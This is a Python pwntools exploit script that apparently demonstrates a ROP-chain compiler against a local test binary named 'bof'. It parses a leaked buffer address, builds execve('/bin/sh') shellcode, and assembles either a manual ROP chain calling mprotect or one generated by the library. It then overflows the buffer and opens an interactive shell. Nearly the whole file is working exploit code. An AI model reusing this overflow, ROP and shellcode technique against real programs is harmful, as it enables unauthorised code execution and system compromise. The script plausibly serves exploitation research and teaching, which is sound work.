import sys, logging
import archinfo
from pwn import *
from rop_compiler import ropme

filename = './bof'
p = process([filename,'3000'])
#gdb.attach(p, "set disassembly-flavor intel\nbreak *0x40063f\nbreak *0x400641\nbreak *0x400643")

line = p.readline()
buffer_address = int(line.split(":")[1],16)

shellcode = ( # http://shell-storm.org/shellcode/files/shellcode-603.php
    "\x48\x31\xd2"                                  # xor    %rdx, %rdx
 +  "\x48\x31\xc0"                                  # xor    %rax, %rax
 +  "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"      # mov  $0x68732f6e69622f2f, %rbx
 +  "\x48\xc1\xeb\x08"                              # shr    $0x8, %rbx
 +  "\x53"                                          # push   %rbx
 +  "\x48\x89\xe7"                                  # mov    %rsp, %rdi
 +  "\x50"                                          # push   %rax
 +  "\x57"                                          # push   %rdi
 +  "\x48\x89\xe6"                                  # mov    %rsp, %rsi
 +  "\xb0\x3b"                                      # mov    $0x3b, %al
 +  "\x0f\x05"                                      # syscall
)
target_address = buffer_address + 1024
print "shellcode ({} bytes) address: 0x{:x}".format(len(shellcode), target_address)

if len(sys.argv) < 2: # manual mode
  print "Using manually built ROP chain"

  POP_RDI = 0x40063f # pop rdi ; ret
  POP_RSI = 0x400641 # pop rsi ; ret
  POP_RDX = 0x400643 # pop rdx ; ret
  POP_RCX = 0x400647 # pop rcx ; ret
  POP_R8  = 0x400649 # pop r8 ; ret
  POP_R9  = 0x40064c # pop r9 ; ret
  MPROTECT = 0x400520

  target_page = target_address & ~0xfff

  rop = (
      p64(POP_RDI)
    + p64(target_page)

    + p64(POP_RSI)
    + p64(0x2000)

    + p64(POP_RDX)
    + p64(7)

    + p64(MPROTECT)
    + p64(target_address)
  )
else:
  print "Using automatically built ROP chain"
  rop = ropme.rop_to_shellcode([(filename, None, None)], [], target_address, archinfo.ArchAMD64(), logging.DEBUG, True)

payload = 'A'*512 + 'B'*8 + rop
payload += ((1024 - len(payload)) * 'B') + shellcode

with open("/tmp/rop", "w") as f: f.write(rop)
with open("/tmp/payload", "w") as f: f.write(payload)

p.writeline(payload)
p.interactive()
